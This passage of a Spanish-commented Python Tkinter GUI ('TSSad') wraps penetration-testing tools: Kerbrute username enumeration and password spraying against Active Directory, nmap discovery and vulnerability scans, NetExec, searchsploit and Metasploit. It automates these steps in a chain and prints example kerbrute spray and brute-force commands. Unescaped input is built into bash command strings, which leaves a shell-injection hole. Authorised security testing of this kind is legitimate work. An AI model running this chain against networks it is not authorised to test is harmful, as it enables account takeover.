        if not os.path.exists(self.kerbrute_path):
            messagebox.showerror("Error", f"Kerbrute no encontrado en:\n{self.kerbrute_path}\n\nVerifica la ruta de instalación.")
            return
        
        # Pedir archivo de usuarios
        user_file = filedialog.askopenfilename(title="Selecciona archivo de usuarios",
                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not user_file:
            return
        
        # Comando kerbrute directo (sin terminal separado para mejor captura de output)
        cmd = ["bash", "-c", f"cd /home/kali/Aplicaciones/TSSad/kerbrute/dist && ./kerbrute_linux_amd64 userenum -d {domain} --dc {dc} {user_file}"]
        
        self.log(f"🔑 INICIANDO KERBRUTE:")
        self.log(f"   Dominio: {domain}")
        self.log(f"   DC: {dc}")
        self.log(f"   Archivo: {user_file}")
        self.log("   💡 Los usuarios se guardan automáticamente conforme se encuentran")
        
        # Ejecutar con procesamiento en tiempo real
        self.run_kerbrute_with_realtime_save(cmd, "Kerbrute Enumeración")
    
    def parse_kerbrute_users(self, kerbrute_output):
        """Extrae usuarios válidos del output de kerbrute"""
        users = []
        
        for line in kerbrute_output.split('\n'):
            line = line.strip()
            
            # Buscar líneas que contengan usuarios válidos
            if "[+] VALID USERNAME:" in line:
                # Extraer el nombre de usuario
                parts = line.split("[+] VALID USERNAME:")
                if len(parts) > 1:
                    username = parts[1].split("@")[0].strip()  # Tomar solo el usuario, no el dominio
                    if username and username not in users:
                        users.append(username)
        
        return users
    
    def run_kerbrute_with_realtime_save(self, cmd, scan_type):
        """Ejecuta Kerbrute y guarda usuarios válidos en tiempo real"""
        def run():
            found_users = []
            try:
                self.log(f"🚀 INICIANDO: {scan_type}")
                self.log(f"Comando: {' '.join(cmd)}")
                self.log("-" * 50)
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                         stderr=subprocess.STDOUT, text=True, 
                                         universal_newlines=True, bufsize=1)
                self.running_processes.append(process)
                
                # Procesar output línea por línea en tiempo real
                while True:
                    line = process.stdout.readline()
                    if line:
                        line = line.rstrip()
                        # Mostrar en tiempo real
                        self.log(f"  {line}")
                        
                        # Buscar usuarios válidos en esta línea
                        if "[+] VALID USERNAME:" in line:
                            # Extraer el nombre de usuario
                            parts = line.split("[+] VALID USERNAME:")
                            if len(parts) > 1:
                                username = parts[1].split("@")[0].strip()
                                # Limpiar códigos ANSI del nombre de usuario
                                username = self.clean_ansi_codes(username)
                                if username and username not in found_users:
                                    found_users.append(username)
                                    self.log(f"👤 USUARIO VÁLIDO ENCONTRADO: {username}")
                                    
                                    # Guardar inmediatamente (agregar al archivo)
                                    self.append_valid_user(username)
                                    
                                    # Actualizar estado
                                    if not hasattr(self, 'valid_users'):
                                        self.valid_users = []
                                    if username not in self.valid_users:
                                        self.valid_users.append(username)
                                        self.update_valid_users_status(True)
                                        self.update_attack_status()
                    
                    # Verificar si el proceso ha terminado
                    if process.poll() is not None:
                        break
                
                # Leer cualquier output restante
                remaining_output = process.stdout.read()
                if remaining_output:
                    for line in remaining_output.split('\n'):
                        if line.strip():
                            self.log(f"  {line.strip()}")
                            # Procesar líneas restantes también
                            if "[+] VALID USERNAME:" in line:
                                parts = line.split("[+] VALID USERNAME:")
                                if len(parts) > 1:
                                    username = parts[1].split("@")[0].strip()
                                    # Limpiar códigos ANSI también aquí
                                    username = self.clean_ansi_codes(username)
                                    if username and username not in found_users:
                                        found_users.append(username)
                                        self.log(f"👤 USUARIO VÁLIDO ENCONTRADO: {username}")
                                        self.append_valid_user(username)
                                        if username not in self.valid_users:
                                            self.valid_users.append(username)
                
                return_code = process.returncode
                
                self.log("-" * 50)
                if return_code == 0:
                    self.log(f"✅ COMPLETADO: {scan_type}")
                    self.show_completion_notification(scan_type, True)
                else:
                    self.log(f"⚠️ PROCESO INTERRUMPIDO: {scan_type} (código: {return_code})")
                    if found_users:
                        self.log(f"💾 Se conservaron {len(found_users)} usuarios encontrados antes de la interrupción")
                
                if found_users:
                    self.log(f"📊 RESUMEN: {len(found_users)} usuarios válidos guardados en total")
                    self.scan_results[scan_type] = f"Usuarios encontrados: {', '.join(found_users)}"
                        
            except Exception as e:
                self.log(f"💥 EXCEPCIÓN en {scan_type}: {str(e)}")
                if found_users:
                    self.log(f"💾 Se conservaron {len(found_users)} usuarios encontrados antes del error")
                self.show_completion_notification(scan_type, False, str(e))
            finally:
                if process in self.running_processes:
                    self.running_processes.remove(process)
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()
    
    def append_valid_user(self, username):
        """Añade un usuario válido al archivo inmediatamente"""
        try:
            # Limpiar códigos ANSI antes de guardar
            username = self.clean_ansi_codes(username)
            
            # Leer usuarios existentes para evitar duplicados
            existing_users = []
            if os.path.exists(self.valid_users_file):
                with open(self.valid_users_file, 'r') as f:
                    existing_users = [line.strip() for line in f if line.strip()]
            
            # Solo añadir si no existe ya
            if username not in existing_users:
                with open(self.valid_users_file, 'a') as f:
                    f.write(f"{username}\n")
                self.log(f"💾 Usuario guardado: {username}")
                
        except Exception as e:
            self.log(f"❌ Error guardando usuario {username}: {str(e)}")
    
    def start_netexec_config(self):
        """Configura y ejecuta NetExec"""
        ip_range = self.ip_range_entry.get().strip()
        if not ip_range:
            messagebox.showerror("Error", "Introduce un rango de IPs")
            return
        
        # Preguntar protocolo
        protocol = simpledialog.askstring("NetExec", "Introduce el protocolo (smb, rdp, ssh, etc.):")
        if not protocol:
            return
        
        cmd = f"netexec {protocol} {ip_range}"
        self.log(f"🌐 INICIANDO NETEXEC: {cmd}")
        
        # Abrir en nueva ventana
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, "NetExec")
    
    def search_exploits(self):
        """Busca exploits con searchsploit"""
        search_term = self.exploit_search_entry.get().strip()
        if not search_term:
            messagebox.showerror("Error", "Introduce un término de búsqueda")
            return
        
        cmd = ["searchsploit", search_term]
        self.log(f"🔍 BUSCANDO EXPLOITS: {search_term}")
        self.run_command_in_thread(cmd, "Búsqueda de Exploits")
    
    def auto_search_exploits(self):
        """Búsqueda automática de exploits basada en servicios encontrados"""
        self.log("🔍 BÚSQUEDA AUTOMÁTICA DE EXPLOITS...")
        self.log("⚠️ Función en desarrollo - Próximamente disponible")
        messagebox.showinfo("Búsqueda Automática", "🔍 Función de búsqueda automática en desarrollo.\n\nPróximamente se alimentará automáticamente de los servicios encontrados en los escaneos.")
    
    def browse_auto_userlist(self):
        """Permite seleccionar wordlist de usuarios para automatización"""
        user_file = filedialog.askopenfilename(
            title="Selecciona wordlist de usuarios",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialdir="/usr/share/wordlists"
        )
        if user_file:
            self.auto_userlist_entry.delete(0, tk.END)
            self.auto_userlist_entry.insert(0, user_file)
    
    def update_automation_status(self):
        """Actualiza el estado de datos disponibles para automatización"""
        if not hasattr(self, 'auto_network_status'):
            return
        
        # Estado de red
        network_range = self.target_entry.get().strip() if hasattr(self, 'target_entry') else ""
        if network_range:
            self.auto_network_status.config(text=f"Rango de red: {network_range}", fg='green')
        else:
            self.auto_network_status.config(text="Rango de red: No configurado", fg='red')
        
        # Estado de hosts
        if self.discovered_hosts:
            self.auto_hosts_status.config(text=f"Hosts descubiertos: {len(self.discovered_hosts)}", fg='green')
        else:
            self.auto_hosts_status.config(text="Hosts descubiertos: 0", fg='red')
        
        # Estado de dominio
        domain = self.domain_entry.get().strip() if hasattr(self, 'domain_entry') else ""
        if domain:
            self.auto_domain_status.config(text=f"Dominio AD: {domain}", fg='green')
        else:
            self.auto_domain_status.config(text="Dominio AD: No configurado", fg='red')
    
    def start_automated_execution(self):
        """Inicia la ejecución automatizada de herramientas"""
        if self.automation_running:
            messagebox.showwarning("Automatización", "Ya hay una automatización ejecutándose")
            return
        
        # Verificar configuración mínima
        network_range = self.target_entry.get().strip() if hasattr(self, 'target_entry') else ""
        if not network_range and self.auto_steps["step1"].get():
            messagebox.showerror("Error", "Configura un rango de red en la pestaña 1.1 para el descubrimiento de hosts")
            return
        
        self.automation_running = True
        self.auto_progress_bar['value'] = 0
        self.auto_progress_label.config(text="Iniciando automatización...", fg='blue')
        
        self.log("🤖 INICIANDO EJECUCIÓN AUTOMATIZADA")
        self.log("="*60)
        
        # Ejecutar en hilo separado
        self.automation_thread = threading.Thread(target=self.run_automation_sequence, daemon=True)
        self.automation_thread.start()
    
    def run_automation_sequence(self):
        """Ejecuta la secuencia completa de automatización"""
        try:
            total_steps = sum(1 for step in self.auto_steps.values() if step.get())
            current_step = 0
            
            # Paso 1: Descubrimiento de hosts
            if self.auto_steps["step1"].get():
                current_step += 1
                self.update_automation_progress(f"Paso {current_step}/{total_steps}: Descubriendo hosts...", 
                                              (current_step - 1) * 100 / total_steps)
                if not self.run_automation_host_discovery():
                    return
                self.automation_wait_for_completion()
            
            # Paso 2: Escaneo detallado
            if self.auto_steps["step2"].get():
                current_step += 1
                self.update_automation_progress(f"Paso {current_step}/{total_steps}: Escaneo detallado...", 
                                              (current_step - 1) * 100 / total_steps)
                if not self.discovered_hosts:
                    self.log("⚠️ No hay hosts para escaneo detallado")
                else:
                    self.run_automation_detailed_scan()
                    self.automation_wait_for_completion()
            
            # Paso 3: Escaneo de vulnerabilidades
            if self.auto_steps["step3"].get():
                current_step += 1
                self.update_automation_progress(f"Paso {current_step}/{total_steps}: Escaneando vulnerabilidades...", 
                                              (current_step - 1) * 100 / total_steps)
                if not self.discovered_hosts:
                    self.log("⚠️ No hay hosts para escaneo de vulnerabilidades")
                else:
                    self.run_automation_vuln_scan()
                    self.automation_wait_for_completion()
            
            # Paso 4: Enumeración de usuarios AD
            if self.auto_steps["step4"].get():
                current_step += 1
                self.update_automation_progress(f"Paso {current_step}/{total_steps}: Enumerando usuarios AD...", 
                                              (current_step - 1) * 100 / total_steps)
                domain = self.domain_entry.get().strip() if hasattr(self, 'domain_entry') else ""
                if not domain:
                    self.log("⚠️ No hay dominio configurado para enumeración AD")
                else:
                    self.run_automation_kerbrute()
                    self.automation_wait_for_completion()
            
            # Paso 5: Búsqueda de exploits
            if self.auto_steps["step5"].get():
                current_step += 1
                self.update_automation_progress(f"Paso {current_step}/{total_steps}: Buscando exploits...", 
                                              (current_step - 1) * 100 / total_steps)
                self.run_automation_exploit_search()
                self.automation_wait_for_completion()
            
            # Paso 6: Password spray
            if self.auto_steps["step6"].get():
                current_step += 1
                self.update_automation_progress(f"Paso {current_step}/{total_steps}: Password spray...", 
                                              (current_step - 1) * 100 / total_steps)
                password = self.auto_password_entry.get().strip()
                if not password or not self.valid_users:
                    self.log("⚠️ No hay contraseña o usuarios válidos para password spray")
                else:
                    self.run_automation_password_spray(password)
                    self.automation_wait_for_completion()
            
            # Completado
            self.update_automation_progress("✅ Automatización completada!", 100)
            self.log("🎉 AUTOMATIZACIÓN COMPLETADA EXITOSAMENTE")
            self.log("="*60)
            
            # Generar informe automáticamente
            self.root.after(1000, self.generate_html_report)
            
        except Exception as e:
            self.log(f"💥 Error en automatización: {str(e)}")
            self.update_automation_progress("❌ Error en automatización", 0)
        finally:
            self.automation_running = False
    
    def update_automation_progress(self, message, progress):
        """Actualiza el progreso de automatización"""
        def update():
            if hasattr(self, 'auto_progress_label'):
                self.auto_progress_label.config(text=message)
                self.auto_progress_bar['value'] = progress
        
        self.root.after(0, update)
    
    def automation_wait_for_completion(self):
        """Espera a que terminen los procesos actuales"""
        while self.running_processes and self.automation_running:
            time.sleep(2)
    
    def run_automation_host_discovery(self):
        """Ejecuta descubrimiento de hosts para automatización"""
        network_range = self.target_entry.get().strip()
        if not network_range:
            return False
        
        self.log(f"🔍 AUTO: Descubriendo hosts en {network_range}")
        cmd = ["nmap", "-sn", network_range]
        
        def discovery_callback(output):
            hosts = self.parse_host_discovery(output)
            if hosts:
                self.discovered_hosts = hosts
                self.save_hosts_to_file(hosts)
                self.save_targets_file()
                self.update_hosts_file_status(True)
                self.log(f"🎯 AUTO: Descubiertos {len(hosts)} hosts vivos")
                self.update_automation_status()
        
        self.run_command_with_callback(cmd, "Auto-Descubrimiento", discovery_callback)
        return True
    
    def run_automation_detailed_scan(self):
        """Ejecuta escaneo detallado para automatización"""
        self.log("🔬 AUTO: Iniciando escaneo detallado")
        cmd = ["nmap", "-Pn", "-sV", "-sC", "-p-", "--open", "-vvv", "-iL", self.hosts_file]
        
        output_file = f"auto_detailed_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd.extend(["-oX", output_file])
        
        self.run_command_in_thread(cmd, "Auto-Escaneo Detallado")
    
    def run_automation_vuln_scan(self):
        """Ejecuta escaneo de vulnerabilidades para automatización"""
        self.log("🛡️ AUTO: Iniciando escaneo de vulnerabilidades")
        cmd = ["nmap", "--script", "vuln", "-vvv", "-iL", self.hosts_file]
        
        output_file = f"auto_vuln_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd.extend(["-oX", output_file])
        
        # Usar callback para procesar vulnerabilidades
        def vuln_callback():
            self.parse_and_save_vulnerabilities(output_file)
        
        self.run_command_in_thread(cmd, "Auto-Escaneo Vulnerabilidades", vuln_callback)
    
    def run_automation_kerbrute(self):
        """Ejecuta Kerbrute para automatización"""
        domain = self.domain_entry.get().strip()
        dc = self.dc_entry.get().strip() if hasattr(self, 'dc_entry') else ""
        userlist = self.auto_userlist_entry.get().strip()
        
        if not userlist:
            # Usar wordlist por defecto
            default_lists = [
                "/usr/share/seclists/Usernames/Names/names.txt",
                "/usr/share/wordlists/fasttrack.txt",
                "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
            ]
            for wordlist in default_lists:
                if os.path.exists(wordlist):
                    userlist = wordlist
                    break
        
        if not userlist or not os.path.exists(userlist):
            self.log("⚠️ AUTO: No se encontró wordlist de usuarios válida")
            return
        
        self.log(f"🔑 AUTO: Enumerando usuarios con {os.path.basename(userlist)}")
        dc_param = f"--dc {dc}" if dc else ""
        cmd = ["bash", "-c", f"cd /home/kali/Aplicaciones/TSSad/kerbrute/dist && ./kerbrute_linux_amd64 userenum -d {domain} {dc_param} {userlist}"]
        
        self.run_kerbrute_with_realtime_save(cmd, "Auto-Kerbrute")
    
    def run_automation_exploit_search(self):
        """Ejecuta búsqueda de exploits para automatización"""
        self.log("🔍 AUTO: Buscando exploits comunes")
        
        # Búsquedas comunes de exploits
        common_searches = ["windows", "smb", "rdp", "ssh", "ftp", "http", "apache", "nginx", "mysql"]
        
        for search_term in common_searches:
            if not self.automation_running:
                break
            self.log(f"🔍 AUTO: Buscando exploits para {search_term}")
            cmd = ["searchsploit", search_term]
            self.run_command_in_thread(cmd, f"Auto-SearchSploit-{search_term}")
            time.sleep(3)  # Pequeña pausa entre búsquedas
    
    def run_automation_password_spray(self, password):
        """Ejecuta password spray para automatización"""
        domain = self.domain_entry.get().strip()
        dc = self.dc_entry.get().strip() if hasattr(self, 'dc_entry') else ""
        
        self.log(f"💥 AUTO: Ejecutando password spray con contraseña: {'*' * len(password)}")
        
        dc_param = f"--dc {dc}" if dc else ""
        cmd = ["bash", "-c", f"cd /home/kali/Aplicaciones/TSSad/kerbrute/dist && ./kerbrute_linux_amd64 passwordspray -d {domain} {dc_param} {os.path.abspath(self.valid_users_file)} {password}"]
        
        self.run_kerbrute_attack_with_realtime_results(cmd, "Auto-Password Spray")
    
    def stop_automation(self):
        """Detiene la automatización en curso"""
        if not self.automation_running:
            messagebox.showinfo("Automatización", "No hay automatización ejecutándose")
            return
        
        if messagebox.askyesno("Parar Automatización", "¿Estás seguro de que quieres parar la automatización?"):
            self.automation_running = False
            self.stop_execution()  # Para todos los procesos
            self.update_automation_progress("🛑 Automatización detenida por usuario", 0)
            self.log("🛑 AUTOMATIZACIÓN DETENIDA POR USUARIO")
    
    def parse_and_save_vulnerabilities(self, xml_file):
        """Parsea archivo XML de nmap y guarda vulnerabilidades encontradas"""
        vulnerabilities_file = "discovered_vulnerabilities.txt"
        
        try:
            if not os.path.exists(xml_file):
                return
            
            self.log(f"🔍 Procesando vulnerabilidades de {xml_file}")
            
            # Leer el archivo XML y extraer vulnerabilities
            with open(xml_file, 'r', encoding='utf-8') as f:
                xml_content = f.read()
            
            vulnerabilities = []
            
            # Buscar patrones de vulnerabilidades en el XML
            # Buscar CVEs
            cve_pattern = r'CVE-\d{4}-\d{4,7}'
            cves = re.findall(cve_pattern, xml_content)
            
            # Buscar scripts de vulnerabilidades que reportaron resultados
            vuln_script_pattern = r'<script id="([^"]*)" output="([^"]*)"'
            vuln_scripts = re.findall(vuln_script_pattern, xml_content)
            
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(vulnerabilities_file, 'a', encoding='utf-8') as f:
                f.write(f"\n[{timestamp}] Análisis de {xml_file}\n")
                f.write("="*50 + "\n")
                
                if cves:
                    f.write(f"CVEs encontradas: {len(set(cves))}\n")
                    for cve in set(cves):
                        f.write(f"  - {cve}\n")
                        vulnerabilities.append(cve)
                
                if vuln_scripts:
                    f.write(f"Scripts de vulnerabilidades ejecutados: {len(vuln_scripts)}\n")
                    for script_id, output in vuln_scripts:
                        if output and len(output) > 10:  # Solo si hay output significativo
                            f.write(f"  - {script_id}: {output[:100]}...\n")
                            vulnerabilities.append(f"{script_id}: {output[:100]}")
                
                f.write("\n")
            
            if vulnerabilities:
                self.log(f"🛡️ Guardadas {len(vulnerabilities)} vulnerabilidades en {vulnerabilities_file}")
            else:
                self.log("ℹ️ No se encontraron vulnerabilidades específicas")
                
        except Exception as e:
            self.log(f"❌ Error procesando vulnerabilidades: {str(e)}")
    
    def start_metasploit(self):
        """Inicia Metasploit"""
        self.log("🚀 INICIANDO METASPLOIT CONSOLE...")
        
        cmd = "msfconsole"
        
        # Abrir en nueva ventana
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, "Metasploit")
    
    def start_netexec_attacks(self):
        """Configura ataques con NetExec"""
        self.log("⚔️ CONFIGURACIÓN DE ATAQUES NETEXEC...")
        self.log("⚠️ Función en desarrollo - Próximamente disponible")
        messagebox.showinfo("NetExec Ataques", "⚔️ Función de ataques NetExec en desarrollo.\n\nPróximamente incluirá opciones para ataques con credenciales, hashes y más.")
    
    def check_tools_availability(self):
        """Verifica qué herramientas están disponibles en el sistema"""
        # Herramientas del sistema
        system_tools = [
            "nmap", "responder", "netexec", 
            "searchsploit", "msfconsole"
        ]
        
        # Herramientas con rutas específicas
        specific_tools = [
            ("kerbrute", self.kerbrute_path)
        ]
        
        self.log("🔧 VERIFICANDO HERRAMIENTAS DISPONIBLES...")
        available_tools = []
        missing_tools = []
        
        # Verificar herramientas del sistema
        for tool in system_tools:
            try:
                result = subprocess.run(["which", tool], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    available_tools.append(tool)
                    self.log(f"  ✅ {tool}: Disponible en sistema")
                else:
                    missing_tools.append(tool)
                    self.log(f"  ❌ {tool}: No encontrado en sistema")
            except:
                missing_tools.append(tool)
                self.log(f"  ❌ {tool}: Error al verificar")
        
        # Verificar herramientas con rutas específicas
        for tool_name, tool_path in specific_tools:
            if os.path.exists(tool_path):
                available_tools.append(tool_name)
                self.log(f"  ✅ {tool_name}: Disponible en {tool_path}")
            else:
                missing_tools.append(tool_name)
                self.log(f"  ❌ {tool_name}: No encontrado en {tool_path}")
        
        # Verificar Nessus (servicio especial)
        nessus_status = self.check_nessus_status()
        if "🟢" in nessus_status:
            available_tools.append("nessus")
            self.log(f"  ✅ nessus: Servicio activo")
        elif "🔴" in nessus_status:
            available_tools.append("nessus")
            self.log(f"  ⚠️ nessus: Servicio instalado pero inactivo")
        else:
            missing_tools.append("nessus")
            self.log(f"  ❌ nessus: Servicio no disponible")
        
        if missing_tools:
            self.log(f"⚠️ Herramientas faltantes: {', '.join(missing_tools)}")
            messagebox.showwarning("Herramientas Faltantes", 
                                 f"❌ Las siguientes herramientas no están disponibles:\n\n{chr(10).join(missing_tools)}\n\nAlgunas funciones pueden no trabajar correctamente.")
        else:
            self.log("✅ Todas las herramientas están disponibles")
            messagebox.showinfo("Verificación Completa", "✅ Todas las herramientas necesarias están disponibles en el sistema.")
        
        return available_tools, missing_tools
    
    def initial_tools_check(self):
        """Verificación inicial silenciosa de herramientas"""
        system_tools = ["nmap", "responder", "netexec", "searchsploit", "msfconsole"]
        missing = []
        
        # Verificar herramientas del sistema
        for tool in system_tools:
            try:
                result = subprocess.run(["which", tool], 
                                      capture_output=True, text=True)
                if result.returncode != 0:
                    missing.append(tool)
            except:
                missing.append(tool)
        
        # Verificar kerbrute en su ubicación específica
        if not os.path.exists(self.kerbrute_path):
            missing.append("kerbrute")
        
        # Verificar Nessus (servicio)
        nessus_status = self.check_nessus_status()
        if "❓" in nessus_status:
            missing.append("nessus")
        
        if missing:
            self.log(f"⚠️ Herramientas no encontradas: {', '.join(missing)}")
        else:
            self.log("✅ Todas las herramientas principales están disponibles")
    
    def show_wordlists_info(self):
        """Muestra información sobre wordlists recomendadas para Kerbrute"""
        info_window = tk.Toplevel(self.root)
        info_window.title("Wordlists Recomendadas - Kerbrute")
        info_window.geometry("600x500")
        info_window.configure(bg='#2b2b2b')
        
        # Título
        title_label = tk.Label(info_window, text="📚 Wordlists Recomendadas para Kerbrute", 
                              font=('Arial', 14, 'bold'), fg='#00ff00', bg='#2b2b2b')
        title_label.pack(pady=10)
        
        # Contenido
        content_text = scrolledtext.ScrolledText(info_window, height=25, width=70,
                                               bg='black', fg='#00ff00', font=('Courier', 9))
        content_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        wordlist_info = """
📋 WORDLISTS COMUNES PARA ENUMERACIÓN DE USUARIOS:

🎯 UBICACIONES EN KALI LINUX:
• /usr/share/wordlists/
• /usr/share/seclists/Usernames/
• /usr/share/wordlists/dirb/
• /usr/share/wordlists/dirbuster/

📁 LISTAS DE USUARIOS RECOMENDADAS:
• names.txt (nombres comunes)
• top-usernames-shortlist.txt (usuarios comunes cortos)
• xato-net-10-million-usernames.txt (10M usuarios)
• Names/names.txt (SecLists)
• common-usernames.txt

🔐 LISTAS DE CONTRASEÑAS RECOMENDADAS:
• /usr/share/wordlists/rockyou.txt (más popular)
• /usr/share/seclists/Passwords/Common-Credentials/
• /usr/share/wordlists/fasttrack.txt
• /usr/share/seclists/Passwords/darkweb2017-top1000.txt

🌐 DESCARGAR SECLISTS (si no está instalado):
   sudo apt install seclists
   
   O desde GitHub:
   git clone https://github.com/danielmiessler/SecLists.git

💡 LISTAS ESPECÍFICAS PARA AD:
• /usr/share/seclists/Usernames/Names/names.txt
• /usr/share/seclists/Usernames/top-usernames-shortlist.txt
• /usr/share/wordlists/fasttrack.txt

🔧 CREAR LISTA PERSONALIZADA:
   echo -e "admin\\nadministrator\\nuser\\ntest\\nguest" > custom_users.txt

📝 FORMATOS COMUNES AD:
• nombre.apellido
• n.apellido  
• nombre
• nombreapellido
• admin, administrator, guest, krbtgt

⚡ EJEMPLO DE USO:
   ./kerbrute_linux_amd64 userenum -d domain.local --dc 192.168.1.10 users.txt
   ./kerbrute_linux_amd64 passwordspray -d domain.local users.txt Password123
   ./kerbrute_linux_amd64 bruteuser -d domain.local passwords.txt admin

🎯 TIP: Comienza con listas pequeñas para pruebas rápidas, luego usa las grandes.
        """
        
        content_text.insert(tk.END, wordlist_info)
        content_text.config(state=tk.DISABLED)
        
        # Botón cerrar
        close_btn = tk.Button(info_window, text="Cerrar", command=info_window.destroy,
                             bg='#ff3333', fg='white', font=('Arial', 10, 'bold'))
        close_btn.pack(pady=10)

def main():
    root = tk.Tk()
    app = TSSad(root)
    root.mainloop()

if __name__ == "__main__":
    main()
